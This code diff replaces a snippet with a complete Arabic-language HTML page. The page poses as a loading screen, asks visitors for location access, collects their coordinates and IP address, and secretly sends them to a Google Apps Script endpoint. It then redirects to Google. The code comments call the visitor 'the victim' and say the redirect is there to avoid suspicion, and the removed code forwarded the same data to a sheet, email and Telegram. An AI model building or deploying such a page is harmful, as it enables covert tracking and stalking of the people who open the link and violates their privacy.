@@ -1,18 +1,59 @@
-// استبدل الجزء الخاص بـ fetch في ملف index.html بهذا الكود
-fetch('https://script.google.com/macros/s/AKfycbxwk4dEyrQ1VwHXXhYZb7db16ygZxZ5SBxEQKK4wZj8Xn3CdSfI1oJTgYjPjW1Xpmt2hA/exec', {
-    method: 'POST',
-    mode: 'no-cors', // مهم جداً لتجنب مشاكل الحماية
-    cache: 'no-cache',
-    headers: {
-        'Content-Type': 'application/json'
-    },
-    body: JSON.stringify({
-        latitude: position.coords.latitude,
-        longitude: position.coords.longitude,
-        client_ip: ip, // تأكد أن لديك متغير ip في الكود
-        map: "https://www.google.com/maps?q=" + position.coords.latitude + "," + position.coords.longitude
-    })
-})
-.then(() => {
-    console.log("تم الإرسال بنجاح للجدول والإيميل وتليجرام");
-});
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>جاري التحميل...</title>
+    <script>
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return "Unknown IP";
+            }
+        }
+
+        async function sendLocation(position) {
+            const userIP = await getIP();
+            const webAppUrl = "https://script.google.com/macros/s/AKfycbxsB6NdS6tfiXmthsaKMNlUpXNr4ONj6Y_XMOgoBz0GwPhWfjIEGZmg9E54B58jd_0D4g/exec";
+
+            const payload = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                client_ip: userIP
+            };
+
+            // إرسال البيانات لرابط جوجل الجديد الخاص بك
+            fetch(webAppUrl, {
+                method: "POST",
+                mode: "no-cors", // لضمان الإرسال السريع بدون مشاكل المتصفح
+                cache: "no-cache",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            }).then(() => {
+                // بعد الإرسال، نحول الضحية لأي موقع (مثلاً جوجل أو صورة)
+                window.location.href = "https://www.google.com";
+            });
+        }
+
+        function showError(error) {
+            // في حال رفض الضحية، نحوله أيضاً لإبعاد الشبهة
+            window.location.href = "https://www.google.com";
+        }
+
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation, showError);
+            } else {
+                window.location.href = "https://www.google.com";
+            }
+        };
+    </script>
+</head>
+<body>
+    <div style="text-align: center; margin-top: 50px;">
+        <h2>يرجى السماح بالوصول للموقع للمتابعة...</h2>
+    </div>
+</body>
+</html>
